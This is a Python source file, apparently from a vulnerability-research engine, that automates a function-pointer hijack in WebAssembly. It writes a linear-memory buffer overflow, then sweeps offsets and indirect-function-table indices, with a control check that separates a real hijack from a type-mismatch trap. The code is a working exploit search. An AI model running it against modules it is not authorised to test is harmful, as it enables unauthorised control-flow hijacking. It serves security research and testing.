"""WebAssembly function-pointer hijack: an overflow in linear memory -> an attacker-chosen
indirect call.

A C function pointer compiled to wasm32 is **not an address**. It is a 4-byte index into the
module's `__indirect_function_table`, stored in linear memory like any other variable, and
`call_indirect` dispatches through it after a run-time TYPE check. So the native hijack this
engine already drives -- overflow a buffer, land a code pointer in the field behind it, detonate
-- exists here too, with two differences that make the native search useless as it stands:

  * the value to write is a small integer, not a 64-bit address, so the cyclic/offset machinery
    that recovers an address from a faulting PC has nothing to recover: there is no PC, and a
    wrong index does not fault at the index's value;
  * there is no way to learn the right index from a fault. The table is small and enumerated in
    the module itself (the element section), so the search is a SWEEP over it rather than a leak.

What counts as confirmation. An index that names no function, or one whose type does not match
the call site, traps with the engine's own message -- `null function or function signature
mismatch` -- which is a FAILED hijack and must never be filed as an effect. A hijack is confirmed
when some index produces a verdict that (a) differs from the module's behaviour on a payload that
does not reach the pointer, and (b) is not that mismatch class, and (c) the benign index at the
same offset does not produce it. The sandbox is the ceiling and the finding says so: there is no
native execution and no shell to spawn, and the demonstrated effect is control of the indirect
call -- which, in a module that imports host functions, is as far as the host's own grants go.
"""
from __future__ import annotations

import struct

#: The engine's verdict when the written index names nothing callable at that call site. A failed
#: hijack, and the one thing a sweep over a table is guaranteed to produce a lot of.
_MISMATCH = ("signature mismatch", "null function", "uninitialized element",
             "indirect call type mismatch")

#: How far into the payload the callback might sit, and the stride. A C struct puts the pointer
#: after the buffer, 4-byte aligned on wasm32.
_MAX_OFFSET = 128
_STEP = 4
#: A table this engine will enumerate. Real C modules have tens of entries; the cap stops a
#: hand-written module with a huge table from turning the sweep into the whole budget.
_MAX_SLOTS = 64
_MAX_ATTEMPTS = 400


def _is_mismatch(verdict: str) -> bool:
    low = (verdict or "").lower()
    return any(m in low for m in _MISMATCH)


def candidate_slots(info) -> list:
    """Table slots worth writing, most likely first.

    The element section says which slots hold functions, so those come first; the rest of the
    table is still swept (a module can fill the table at run time) but only up to the cap."""
    size = int(getattr(info, "table_size", 0) or 0)
    # The element segment's own order maps slot -> function; its length is how many are filled.
    n_filled = len(getattr(info, "table_funcs", []) or [])
    first = list(range(min(n_filled + 1, size or n_filled + 1)))
    rest = [i for i in range(min(size or 0, _MAX_SLOTS)) if i not in first]
    out = (first + rest)[:_MAX_SLOTS]
    return out or list(range(8))


def payload_for(offset: int, index: int, *, filler: bytes = b"A", tail: int = 8) -> bytes:
    """Filler up to `offset`, the table index as a little-endian i32, then a short tail so a copy
    whose length comes from the payload still covers the pointer."""
    return filler * offset + struct.pack("<i", index) + filler * tail


def find_hijack(module_bytes: bytes, run, *, max_offset: int = _MAX_OFFSET, step: int = _STEP,
                max_attempts: int = _MAX_ATTEMPTS, should_cancel=None) -> dict | None:
    """Sweep (offset, table index) for an attacker-chosen indirect call.

    `run(payload) -> str` drives the module and returns its verdict as a string (the engine's trap
    message, or "clean"). Injected rather than taken, so the search is testable without node.
    Returns {offset, index, verdict, payload, baseline, control_verdict, slots_tried} or None.
    """
    from .. import wasm as wasmmod
    info = wasmmod.parse(module_bytes)
    slots = candidate_slots(info)
    # A payload that does NOT reach the pointer: the module's own behaviour, and the thing every
    # candidate verdict is compared against.
    baseline = run(b"A" * 8)
    attempts = 0
    for offset in range(0, max_offset + 1, step):
        # The control index is chosen AT THIS OFFSET: a slot that leaves the module behaving as it
        # does on a payload that never reaches the pointer. Picking one from another offset would
        # compare two different writes and call the difference a hijack.
        benign = None
        for index in slots:
            if attempts >= max_attempts or (should_cancel and should_cancel()):
                return None
            attempts += 1
            verdict = run(payload_for(offset, index))
            if verdict == baseline:
                benign = benign if benign is not None else index   # a slot that changes nothing
                continue
            if _is_mismatch(verdict):
                continue                                  # the index is not callable here
            # CONFIRM: the same offset with a benign index must not produce this verdict.
            ctrl_index = benign if benign is not None else (int(getattr(info, "table_size", 0) or 0)
                                                            + 1024)
            control = run(payload_for(offset, ctrl_index))
            if control == verdict:
                continue                                  # not ours: the offset alone does it
            return {"offset": offset, "index": index, "verdict": verdict,
                    "payload": payload_for(offset, index), "baseline": baseline,
                    "control_verdict": control, "control_index": ctrl_index,
                    "slots_tried": len(slots), "attempts": attempts,
                    "table_size": getattr(info, "table_size", None)}
    return None
